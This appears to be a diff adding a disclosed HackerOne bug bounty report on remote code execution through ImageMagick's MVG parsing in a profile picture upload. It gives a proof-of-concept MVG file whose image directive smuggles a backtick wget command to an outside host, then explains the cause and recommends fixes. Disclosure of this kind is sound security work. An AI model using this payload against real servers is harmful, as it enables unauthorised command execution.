@@ -1,0 +1,35 @@
+ReportLink:https://hackerone.com/reports/135072
+WeaknessName:Code Injection
+Reporter:https://hackerone.com/c666a323be94d57
+ReportedTo:HackerOne(security)
+BountyAmount:2500.0
+Severity:
+State:Closed
+DateOfDisclosure:08.06.2016 10:14:12
+
+Summary:
+
+Issue
+=====
+The profile picture upload at /settings/profile/edit is vulnerable to remote code execution due to the uploaded file being passed to ImageMagick without checking whether it's an actual image. Combined with the fact that ImageMagick parses ASCII text as so called MVG (Magic Vector Graphics), this enables an attacker to trigger a newly discovered vulnerability in MVG parsing which allows for command injection.
+
+Steps to reproduce
+======
+Upload the following ASCII file as **x.gif** using the regular profile picture upload flow:
+```
+push graphic-context
+viewbox 0 0 640 480
+image over 0,0 0,0 'https://127.0.0.1/x.php?x=`wget -O- 1.2.3.4:1337 > /dev/null`'
+pop graphic-context
+```
+This executes the `wget` command and makes an HTTP request to 1.2.3.4 on port 1337.
+
+Technical details
+======
+The "image" directive in MVG allows for the usage of so called "delegates" which are somewhat similar to a protocol specifier in a URL: a colon-seperated (delegate,argument)-pair like e.g. "label:SomeText" can be specified, invoking the respective delegate handler. Custom delegates can be added as a bash-call with substitute variables in /etc/ImageMagick/delegates.xml. The handler for https-URLs uses a bash command to invoke curl which suffers from the command injection vulnerability.
+
+Recommendation
+======
+A simple fix is to check the magic values of the uploaded files and whitelist those, i.e. to only allow JPEG, GIF and PNG uploads before passing the file to ImageMagick (e.g. the `convert` utility).
+Also, servers that do image processing should not be able to establish outbound network connections.
+This vulnerability will be reported to ImageMagick within the next 72 hours as a detailed advisory about this and several other MVG issues is currently being drafted.
